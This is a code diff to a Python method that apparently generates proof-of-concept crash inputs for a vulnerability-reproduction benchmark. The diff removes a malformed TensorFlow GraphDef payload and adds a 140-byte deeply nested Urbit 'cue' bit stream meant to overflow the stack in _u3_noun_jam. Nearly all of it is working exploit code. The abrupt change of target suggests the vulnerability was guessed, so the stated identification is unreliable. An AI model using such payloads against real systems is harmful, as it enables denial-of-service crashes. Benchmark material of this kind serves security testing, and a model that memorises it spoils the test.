@@ -1,58 +1,56 @@
-import struct
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
-        The vulnerability corresponds to a missing check in 'node_id_map' lookup 
-        during GraphDef parsing (likely in TensorFlow Profiler/Trace events).
-        The PoC is a GraphDef Protobuf with a node referencing a non-existent input node.
+        
+        The vulnerability corresponds to OSS-Fuzz Issue 28766 in Arvo (Urbit), which is a 
+        Stack-overflow in _u3_noun_jam. This typically occurs when processing a noun with 
+        excessive recursion depth.
+        
+        We construct a "Left-Deep" binary tree of cells to maximize stack depth during traversal
+        within the 140-byte limit.
+        
+        Format: Urbit 'cue' serialization bit stream (Little Endian).
+        - Cell tag: '1' followed by '0' (2 bits)
+        - Atom 0: '0' followed by '0' (2 bits)
+        
+        Structure: [[[[... 0] 0] 0] ... 0]
+        Encoding sequence:
+        1. N times '10' (Open N cells)
+        2. '00' (Innermost Head is Atom 0)
+        3. N times '00' (Close N tails with Atom 0)
+        
+        Total bits = 2*N + 2 + 2*N = 4*N + 2
+        Constraint: 140 bytes = 1120 bits
+        4N + 2 <= 1120 => 4N <= 1118 => N = 279
         """
+        N = 279
+        bits = []
         
-        def encode_varint(n):
-            if n == 0:
-                return b'\x00'
-            parts = []
-            while n > 0:
-                part = n & 0x7F
-                n >>= 7
-                if n > 0:
-                    part |= 0x80
-                parts.append(part)
-            return bytes(parts)
-
-        def encode_string_field(field_num, value):
-            # Wire type 2 for Length Delimited
-            tag = (field_num << 3) | 2
-            val_bytes = value.encode('utf-8')
-            return encode_varint(tag) + encode_varint(len(val_bytes)) + val_bytes
-
-        # Construct NodeDef
-        # Field 1: name (string)
-        # Field 2: op (string)
-        # Field 3: input (repeated string)
+        # 1. Open N cells (Heads)
+        # Sequence: 1, 0
+        for _ in range(N):
+            bits.append(1)
+            bits.append(0)
+            
+        # 2. Innermost Head (Atom 0)
+        # Sequence: 0, 0
+        bits.append(0)
+        bits.append(0)
         
-        # We create a node named "A" with op "NoOp" that inputs "B".
-        # "B" is not defined in the graph, triggering the map lookup failure.
-        node_def = b''
-        node_def += encode_string_field(1, "A")
-        node_def += encode_string_field(2, "NoOp")
-        node_def += encode_string_field(3, "B") # Missing reference
-
-        # Construct GraphDef
-        # Field 1: node (repeated NodeDef)
-        # Field 3: version (int32) - strictly not required to trigger crash but good for validity
-        
-        graph_def = b''
-        
-        # Add version = 1
-        # Field 3, Wire type 0 (Varint)
-        graph_def += encode_varint((3 << 3) | 0) + encode_varint(1)
-        
-        # Add node
-        # Field 1, Wire type 2 (Length Delimited)
-        graph_def += encode_varint((1 << 3) | 2)
-        graph_def += encode_varint(len(node_def))
-        graph_def += node_def
-        
-        return graph_def
+        # 3. Close N tails (Atom 0)
+        # Sequence: 0, 0
+        for _ in range(N):
+            bits.append(0)
+            bits.append(0)
+            
+        # 4. Pack bits into bytes (Little Endian)
+        # Bit stream starts at LSB of first byte.
+        output = bytearray(140)
+        for i, bit in enumerate(bits):
+            if bit:
+                byte_idx = i // 8
+                bit_idx = i % 8
+                output[byte_idx] |= (1 << bit_idx)
+                
+        return bytes(output)
